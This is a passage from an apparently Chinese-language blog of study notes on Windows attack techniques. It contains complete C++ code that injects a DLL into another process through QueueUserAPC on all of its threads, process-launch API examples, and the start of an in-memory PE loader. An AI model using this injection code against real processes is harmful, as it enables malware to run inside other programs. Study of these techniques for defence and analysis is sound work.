class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] PAPCFUNC  pfnAPC,  ;指向应用程序提供的 APC 函数的指针，该函数在指定线程执行可警报等待操作时调用。</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HANDLE    hThread, ;线程的句柄。</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] ULONG_PTR dwData ;传入的参数</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>所以，我们可以将第一个参数设置为LoadLibraryA的函数指针，第三个参数设置为dll路径，就可以达到注入的目的，如果说CreateRemoteThread是在目标进程中创造了一个线程用LoadLibraryA(“dll路径”)，QueueUserAPC就是向进程的线程的APC队列插入了个待执行的函数。</p><p>为了提高注入成功率，将会对一个进程的所有线程的APC队列进行QueueUserAPC函数注入。</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindAllThreadId</span><span class="params">(DWORD dwPID, DWORD *dwThreadIdArr, DWORD *dwArrLenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hshot;</span><br><span class="line">THREADENTRY32 lpte= &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD Lenth=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hshot)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateToolhelp32Snapshot Failed!!! %d&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RtlZeroMemory(&amp;lpte, <span class="keyword">sizeof</span>(lpte));</span><br><span class="line">lpte.dwSize = <span class="keyword">sizeof</span>(lpte);</span><br><span class="line">BOOL bt32f=Thread32First(hshot, &amp;lpte);</span><br><span class="line"><span class="keyword">if</span> (bt32f == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Thread32First Failed!!!%d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (lpte.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line">dwThreadIdArr[Lenth] = lpte.th32ThreadID;</span><br><span class="line">Lenth++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (Thread32Next(hshot, &amp;lpte));</span><br><span class="line"></span><br><span class="line">*dwArrLenth = Lenth;</span><br><span class="line">CloseHandle(hshot);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyAPCInjectDll</span><span class="params">(DWORD dwPID, LPCSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;<span class="comment">//目标进程的句柄 </span></span><br><span class="line">LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwBufSize = (DWORD)<span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line">PVOID pThreadProc;</span><br><span class="line">HMODULE hMod;</span><br><span class="line">DWORD ThreadIdArr[<span class="number">1000</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">DWORD ArrLenth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//申请dll路径大小的空间</span></span><br><span class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pRemoteBuf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入dll路径</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory failed!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">pThreadProc = (PVOID)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc== <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress failed!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> == FindAllThreadId(dwPID, ThreadIdArr, &amp;ArrLenth))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FindAllThreadId failed!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ArrLenth; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ThreadIdArr[i]);</span><br><span class="line">hThread =OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadIdArr[i]);</span><br><span class="line"><span class="keyword">if</span> (hThread)</span><br><span class="line">&#123;</span><br><span class="line">DWORD check=QueueUserAPC((PAPCFUNC)pThreadProc, hThread, (ULONG_PTR)pRemoteBuf);</span><br><span class="line"><span class="keyword">if</span> (check == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;QueueUserAPC failed!!!  %d\n&quot;</span>,GetLastError());</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MyAPCInjectDll(<span class="number">25944</span>, <span class="string">&quot;d://myhack64.dll&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意事项，环境需要为x64环境编译，并且dll文件也应该是64位的，发现了个奇怪的现象，对QQ.exe注入的时候，直接崩溃报错。</p><h2 id="第四章-启动技术"><a href="#第四章-启动技术" class="headerlink" title="第四章-启动技术"></a>第四章-启动技术</h2><p>如何启动一个进程。</p><h3 id="启动进程API"><a href="#启动进程API" class="headerlink" title="启动进程API"></a>启动进程API</h3><p>第一个API，WinExec。</p><pre><code>UINT WinExec(  [in] LPCSTR lpCmdLine,  [in] UINT   uCmdShow);</code></pre><p>第一个参数就是指定文件路径或者cmd命令行，第二个参数就是是否显示窗口，常见的有SW_HIDE隐藏窗口并激活另一个窗口，SW_SHOWNORMAL 激活并显示一个窗口。</p><p>第二个API，ShellExecute。</p><pre><code>HINSTANCE ShellExecuteA(  [in, optional] HWND   hwnd,  [in, optional] LPCSTR lpOperation,  [in]           LPCSTR lpFile,  [in, optional] LPCSTR lpParameters,  [in, optional] LPCSTR lpDirectory,  [in]           INT    nShowCmd);</code></pre><p>第3个参数代表文件路径，最后个参数代表窗口显示。</p><p>第三个API，CreateProcess，不多讲了，功能很多。</p><p>下面是三个函数的总合代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test1</span><span class="params">(LPCSTR pszExePath, UINT uCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT uRet = WinExec(pszExePath, uCmdShow);</span><br><span class="line"><span class="keyword">if</span> (uRet&lt;= <span class="number">31</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WinExec Failed !!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test2</span><span class="params">(LPCSTR pszExePath, UINT uCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE hRet = ShellExecuteA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, pszExePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, uCmdShow);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)hRet &lt;= <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WinExec Failed !!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test3</span><span class="params">(LPCSTR pszExePath, UINT uCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFOA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//包含wShowWindow</span></span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = uCmdShow;</span><br><span class="line">    <span class="keyword">if</span> (!CreateProcessA(</span><br><span class="line">        pszExePath,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,  <span class="comment">//不继承进程句柄</span></span><br><span class="line">        <span class="literal">NULL</span>,  <span class="comment">//不继承线程句柄</span></span><br><span class="line">        FALSE, <span class="comment">//不继承句柄 </span></span><br><span class="line">        <span class="number">0</span>,     <span class="comment">//没有创建标志，常用的有一个CREATE_SUSPENDED，立即挂起新进程。除非调用了ResumeThread函数函数，否则它不会恢复运行。可以用来干坏事。</span></span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi)</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateChildProcess Error%d&quot;</span>, GetLastError());   </span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(pi.hProcess);   <span class="comment">//关闭句柄</span></span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> szFilePath[MAX_PATH] = <span class="string">&quot;C:\\Windows\\system32\\notepad.exe&quot;</span>;</span><br><span class="line">test1(szFilePath, SW_SHOWNORMAL);</span><br><span class="line">test2(szFilePath, SW_SHOWNORMAL);</span><br><span class="line">test3(szFilePath, SW_SHOWNORMAL);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存直接加载"><a href="#内存直接加载" class="headerlink" title="内存直接加载"></a>内存直接加载</h3><p>本质就是自己用代码去加载一个DLL文件或者exe文件，不得不说，书上讲的真少，实际上过程和脱一个壳都差不多了。需要了解点PE结构的知识，PE结构嘛，无非就是一大堆结构体。</p><p>本过程相比于我在第七章讲的傀儡进程-PE映像切换，多了两个步骤，修改PE文件重定位表信息和填写PE文件导入表信息(IAT)。</p><pre><code>//《逆向工程核心原理》中都能找到两个概念的介绍PE重定位向进程的虚拟内存中加载PE文件时，文件会被加载到PE头的ImageBase所指的地址处，该位置存在被占用可能，此时PE装载器会将其加载到其他未被占用的空间。PE重定位指PE文件无法加载到ImageBase所指位置，而是加载到其他地址时发生的一系列行为。创建进程后，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题。IAT简单来说就是存储函数地址的结构体</code></pre><p>然后产生了三个问题</p><ul><li>为什么PE映像切换就不用做这两件事，就可以加载一个exe文件了呢？</li><li>为什么需要修改PE文件重定位表信息?</li><li>为什么需要填写PE文件导入表信息(IAT)?</li></ul><p>在粗略阅读下面文章后，稍微理解了一些。<br><a href="https://www.cnblogs.com/littlehann/p/3458736.html">windows进程/线程创建过程 — windows操作系统学习</a><br><a href="https://bbs.pediy.com/thread-268005-1.htm#msg_header_h3_3">[原创]PE映像切换技术(Process Hollowing)不需要填充IAT表和进行重定位的原因</a><br><a href="https://bbs.pediy.com/thread-151939.htm">[原创]为什么某些壳脱壳后需要修复IAT</a></p><p>然后以我自己的理解来解答下，可能并不对。</p><ul><li>第一个问题：因为我们以挂起线程调用CreateProcess()函数后，然后切换了PE映像，这两个操作都是在重新启动线程后完成的。其实我对此解释也抱着半信半疑的态度，一是根据其文章的描述不能具体看到起函数是否执行了相关操作，二是因为看了对PE重定位的概念，创建进程后，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题。在利用CreateProcess()创建进程的前提下，对于exe文件来说，已经分配了4gb的虚拟内存，默认imagebase一般都是0x400000，不需要重定位，所以删除.reloc这个节区对程序的运行一般不会照成任何影响。</li><li>第二个问题：虽然说exe不需要考虑重定位问题，但是那是在创建进程的前提下，而我们手动加载一个exe文件实际上利用的是VirtualAlloc函数在本进程中再申请一段内存空间作为映像的基址，所以肯定就需要重新定位下了。</li><li>第三个问题，为什么要填写IAT，就是因为dll不一定都完全按照他们的imagebase来加载到相应的基地址，IAT对应的硬编码不一定就是确切的函数地址，exe加载到内存后准确的地址会取代改位置的值。所以，我们需要自己利用GetProcAddress函数来取得确切的地址，然后填入进去。</li></ul><p>下面来利用一个随便写的exe程序来感受下PE重定位和IAT，实际上都可以在《逆向工程核心原理》一书中找到相关知识点讲解。</p><pre><code>// Based relocation format.////@[comment(&quot;MVI_tracked&quot;)]typedef struct _IMAGE_BASE_RELOCATION &#123;    DWORD   VirtualAddress;    DWORD   SizeOfBlock;//  WORD    TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;//// Based relocation types.//#define IMAGE_REL_BASED_ABSOLUTE              0#define IMAGE_REL_BASED_HIGH                  1#define IMAGE_REL_BASED_LOW                   2#define IMAGE_REL_BASED_HIGHLOW               3#define IMAGE_REL_BASED_HIGHADJ               4#define IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5#define IMAGE_REL_BASED_RESERVED              6#define IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7#define IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8#define IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9#define IMAGE_REL_BASED_DIR64                 10</code></pre><p><img src="https://s2.loli.net/2022/01/31/2CzocvpYatFVE7e.png"></p><p>IAT，还是贴出相关结构体。</p><p>IMAGE_IMPORT_DESCRIPTOR</p><pre><code>typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;    union &#123;        DWORD   Characteristics;            // 0 for terminating null import descriptor        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)    &#125; DUMMYUNIONNAME;    DWORD   TimeDateStamp;                  // 0 if not bound,                                            // -1 if bound, and real date\time stamp                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)                                            // O.W. date/time stamp of DLL bound to (Old BIND)    DWORD   ForwarderChain;                 // -1 if no forwarders    DWORD   Name;    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</code></pre><p>IMAGE_IMPORT_BY_NAME</p><pre><code>typedef struct _IMAGE_IMPORT_BY_NAME &#123;    WORD    Hint;    CHAR   Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</code></pre><p>我们修改的主要是IMAGE_IMPORT_DESCRIPTOR结构体中的FirstThunk，也就是IAT中的RVA。<br><img src="https://s2.loli.net/2022/01/31/umdZo97DFijMhGw.png"><br>那么如何获得相关函数的地址，然后填上去呢，我们可以利用IMAGE_IMPORT_DESCRIPTOR结构体获得dll的名称，和该程序调用了dll那些函数的名称，然后用GetProcAddress去获得函数实际地址然后填入IAT的相对应位置。并且DLL的导出函数有两种，分为函数名称导出，和序号导出，这也是个新知识点吧<a href="https://www.xuebuyuan.com/1266850.html">https://www.xuebuyuan.com/1266850.html</a>。</p><p>这里多说一句，为什么会有IAT这个东西，为什么我们调用某个官方函数时，不直接调用起真实地址。原因就在于，对于不同的windows版本和DLL版本，可能这些地址是不同的，所以采取的一般方式是在程序加载时，才获取真实的函数地址到IAT中的对应位置。</p><p>完整代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReadExeFile</span><span class="params">(CHAR* szNewFilePath, BYTE** buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">HANDLE hFile;</span><br><span class="line"></span><br><span class="line">hFile = CreateFileA(szNewFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">*buffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ReadFile(hFile, *buffer, dwFileSize, &amp;dwNumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ImageWrite</span><span class="params">(LPVOID 